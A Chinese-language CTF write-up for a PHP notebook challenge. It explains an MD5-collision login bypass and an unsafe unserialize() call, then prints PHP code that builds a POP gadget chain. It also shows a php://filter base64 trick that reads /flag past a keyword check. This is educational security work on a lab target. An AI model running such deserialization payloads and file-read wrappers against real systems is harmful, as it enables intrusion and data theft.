进入后是一个界面
`Try to input something to be admin!Only admin can get into my notebook!`

打开console,发现出题人给我们留下了hint:`<!--try ./www.zip to find some source code???-->`
访问`/www.zip`我们得到了源码文件

然后给了两个checkcode表单输入框
那先试试吧,随便丢两个输入试试
提示`The md5 of two checkcodes should be equalled!`

我的第一反应也很简单,直接两个一样的字符串不就md5相同了?
`The checkcodes cannot be equalled or empty!`
看来并没有这么简单

*****
## md5碰撞
这里牵扯了一个概念:md5碰撞
也就是像题目里面这样:两个不同的原文,在经过md5加密后的密文确是相同的
其实出现这种现象是必然的,md5本身就是将无限个可能的原文(不限制长度),映射到有限个密文(长度确定)上

由于题目没有要求,直接在搜索引擎上就能找到现成的
`TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak`
和`TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak`
成功
*****

进入的就是正式的notebook界面了
我们可以输入note,然后网站会将输入的note标上123返回在界面上

*****
## 还是先看看源码吧
-注:因为本人对php很不了解(xwx),所以会写很多基础的内容
static储存的是css信息,似乎没什么重要的
重点在后面的php文件

从主界面index.php开始 
只有开头是php代码:
```php
<?php
    session_start();  //开启一个对话
    include 'login_check.php';  //执行另一个文件的代码,检查是否登录
```
******
看看`session_start()`函数:
开启对话,根据cookie里面的session信息,有就恢复,没有就创建并发给浏览器并存入全局变量`$_session`,后面就可以调用这个全局变量并查看会话信息了
******
后面的html和js大概就是将用户的输入post出去然后将笔记里面的内容get回来,也没什么问题

由于我们已经成功登录了,所以暂时也不用研究登录代码的逻辑了
*****
## 那继续看sava.php吧
```php
<?php
session_start();
include 'login_check.php';

function saveSessionData()
{
    $filename = "/tmp/My-NoteBook.txt";
    $data = file_get_contents("php://input");
    file_put_contents($filename,$data."|",FILE_APPEND);
}

if($_SERVER['REQUEST_METHOD'] == 'POST'){
    saveSessionData();
}else{
    echo "Request Method Not Allowed";
    return;
}
```
前面先检查登录状态
看函数`saveSessionData()`里面
`$data = file_get_contents("php://input");` 新建一个data变量并将
http的正文放到里面,也就是读取我们输入的笔记
`file_put_contents($filename,$data."|",FILE_APPEND);`:
将刚刚的$data加上一个 | 后,以追加模式放到file里面

后面写如果是post请求,就执行存信息的函数

我们可以发现,这里的save没有对我们的输入做任何的过滤,这给后面也埋下了伏笔
*****
## 看另一个get.php
```php
<?php
session_start();
include 'login_check.php';
include 'mainclass.php';
  
function loadSessionDatas(array $total):array
{
    $filename = "/tmp/My-NoteBook.txt";
    if (file_exists($filename)) {
        $res = file_get_contents($filename);
        $count = count(explode("|", $res)) - 1; 
        for ($i = 0; $i < $count; $i++) {
            $total[$i] = explode("|", $res)[$i];
            if (is_serialized($total[$i])) {
                unserialize($total[$i]);
            }
        }
        return $total;
    } else {
        file_put_contents($filename, '');
        return [];
    }
}

function is_serialized($data):bool{
    $data = trim($data);
    if('N;' == $data)
        return true;
    if(!preg_match('/^([adObis]):/',$data,$options))
        return false;
    switch($options[1]){
        case 'a':
        case 'O':
        case 's':
            if(preg_match( "/^$options[1]:[0-9]+:.*[;}]\$/s", $data))
                return true;
            break;
        case 'b':
        case 'i':
        case 'd':
            if(preg_match("/^$options[1]:[0-9.E-]+;\$/",$data))
                return true;
            break;
    }
    return false;
}
    $context = array();
    $res = loadSessionDatas($context);
    echo json_encode($res);
```
前面依然先检查登录,但是这里还塞入了一个奇怪的文件,我们等下再看

先看看他自己的两个function
`loadSessionDatas`,前面的部分配合搜索函数的功能很好理解,就是将笔记里的内容按照 | 分割,然后调用自己的函数`is_serialized`,如果返回true的话就
将笔记**unserialize**

重点就在这里的unserialize了,也就是反序列化
## 什么是unserialize和serialize
serialize: 将复杂的不通用的数据结构,比如各个语言里面的对象,字典,数组
转化造成较为通用的线性格式:字符串,二进制等.  以达到持久保存,跨平台和语言传输的效果
unserialize:效果相反

所以在这里我们的输入可以被反序列化!
可以看到在后面的判断函数中,`case:'o'`也就是对象是可以被反序列化的
这个就给我们又一个漏洞点

## 最后一个文件mainclass
里面储存了三个类,我们一个一个看
```php
class HereWeGo{
    public $try;
    public function __destruct(){
        $this->try->gogogo();
    }
}
```
有一个变量$try和一个magic methods: `__destruct()` 他会在类被销毁时被调用 : 尝试调用变量try的gogogo()方法
这里有一点难以理解,由于php不限制变量的类型,所以变量$try可以是一个任意的类的对象,那他就会有对象所对应的方法

那我们看gogogo()方法出现在哪里:
```php
class GoGoGo{
    public $go;
    public function __construct($go)
    {
        $this->go = $go;
    }
    
    public function __call($name,$arguments){
        return $this->go->web;
    }
}
```
定义了一个go变量,一个构造方法,和又一个majic方法`__call`,他会在
调用一个不存在或不可用的方法时触发
他会去访问go的web变量;

下一个class
```php
class Evil{
    public $file;
    public $final;

    public function __construct($file){
        $this->file = $file;
    }
    //The flag is in /flag
    public function __get($Attribute){
        $result = file_get_contents($this->file);
        if(preg_match('/vidar/i',$result)){
            $this->final = "HACKER!!!";
            file_put_contents('flag.txt',$this->final);
            return;
        }
        $this->final = $result;
        file_put_contents('flag.txt',$this->final);
    }
}
```
包含一个构造函数,又一个magic方法__get,他会在访问没有或不可用的变量时触发
这个方法会读取构造函数传入的file文件,并判断里面有没有`vidar`字样
如果没有就会将文件写入flag.txt

****
看完这三个类,我们的目的就很明确了:
将提示里的/flag文件作为构造方法的参数传递给evil函数
他就会把这个文件写进flag.txt,由于没有写/,代表的是相对目录,也就是服务器的程序所在的当前目录,所以我们就可以直接在浏览器上访问了

怎么执行这个构造方法呢?  当然要用到之前的反序列化了!
我们直接在笔记栏输入序列化以后的对象和构造方法参数/flag
就会触发反序列化,将我们的输入转为对象,并在这个过程中调用一些魔法方法,来完成我们需要做的

## 构造payload
这个过程调用的函数由`herewego`里的`__destruct`开始

*****
因为在 get.php里面
```php
if (is_serialized($total[$i])) {
    unserialize($total[$i]); 
```
这里将输入进行反序列化后,并没有将对象赋值给其他的对象,
在php里,对象被销毁有3种情况:
1. 引用计数=0
2. 脚本结束
3. 手动销毁
这里显然是第一种情况,但其实就算这里将对象赋给一个变量,在程序结束时,对象也会被销毁,从而触发我们的攻击链,所以无伤大雅
*****
我们的payload在反序列化后的对象就应该大概是:`HereWeGo[gogogo[evil]]`
这样一层层的调用
所以我们用new来实例化对象
```php
<?php
include 'mainclass.php';

$evil = new Evil("/flag");
$gogogo = new GoGoGo($evil);
$herewego = new HereWeGo();
  
$herewego->try = $gogogo;

$payload = serialize($herewego);//序列化
echo $payload;
```
运行php代码得到payload,然后输入笔记本
诶没有返回期待的flag,而是hacking,
突然想起来之前在class里面有写,如果写入evil的里面含有vidar,会被篡改
那我们可以在php伪协议(php://)后面集上一个filter,把flag转为base64再保存,就不会被拦截了!
将/flag改成`php://filter/convert.base64-encode/resource=/flag`
再次尝试,
ok结束

